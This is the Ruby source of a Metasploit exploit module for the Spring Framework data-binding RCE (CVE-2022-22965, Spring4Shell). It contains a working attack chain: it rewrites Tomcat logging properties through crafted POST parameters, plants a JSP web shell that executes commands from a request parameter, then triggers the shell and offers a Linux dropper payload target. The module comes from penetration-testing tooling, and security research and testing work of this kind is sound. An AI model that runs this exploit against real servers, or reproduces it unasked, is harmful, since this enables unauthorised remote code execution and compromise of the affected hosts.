##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Spring Framework RCE via Data Binding',
        'Description' => %q{
          A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE)
          via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the
          application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit.
          However, the nature of the vulnerability is more general, and there may be other ways to exploit it.
        },
        'Author' => [
          'helloexp', # vulnerability discovery
          'Heyder Andrade' # module
        ],
        'References' => [
          ['CVE', '2022-22965'],
          ['URL', 'https://tanzu.vmware.com/security/cve-2022-22965']
        ],
        'DisclosureDate' => '2022-03-30',
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper
            }
          ]
        ],
        'DefaultTarget' => 1,
        'Notes' => {
          'AKA' => [ 'SpringShell', 'Spring4Shell' ],
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  def check
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'data' => "class.module.classLoader.DefaultAssertionStatus=#{Rex::Text.rand_text_alpha_lower(4..6)}"
    )

    return CheckCode::Unknown unless res

    return CheckCode::Safe unless res.code == 400
   
    Exploit::CheckCode::Appears
  end

  def exploit
    # print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
    "java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
    "(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
    "%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"

    filename = Rex::Text.rand_text_alpha_lower(4..6)
    directory = 'webapps/ROOT'
    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    log_file_dir = "class.module.classLoader.resources.context.parent.pipeline.first.directory=#{directory}"
    log_file_prefix = "class.module.classLoader.resources.context.parent.pipeline.first.prefix=#{filename}"
    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    exp_data = [log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format].join('&')

    @headers = {
      'Accept-Encoding' => 'gzip, deflate',
      'Accept' => '*/*'
    }
    # puts exp_data
    trick
    # Change the tomcat log location variables
    change_log exp_data
    # Changes take some time to populate on tomcat
    sleep(3)

    write_payload
    sleep(1)

    reset_pattern
    sleep(3)
    trigger_payload filename
   
  end
  def trick
    vprint_status '>> TRICK <<'
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'headers' => @headers,
      'data' => 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_'
    )
  end

  def change_log(body_data)
    vprint_status 'Modifying Log Configurations'
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'headers' => @headers,
      'data' => body_data
    )
  end

  def write_payload
    vprint_status 'Send the packet that writes the web shell'
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'headers' => @headers.merge({
        'prefix' => '<%',
        'suffix' => '%>//',
        'c' =>  'Runtime',
      })
    )
  end

  def reset_pattern
    vprint_status 'Reset the pattern to prevent future writes into the file'
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'headers' => @headers,
      'data' => 'class.module.classLoader.resources.context.parent.pipeline.first.pattern='
    )
  end

  def trigger_payload(filename)
    vprint_status 'Triggering the payload'
    
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri("/#{filename}.jsp?cmd=id"),
    )

    vprint_good("succesfully ... /#{filename}.jsp") if res.code.to_i == 200
  
    vprint_good(res.body)

    
  end
   
end
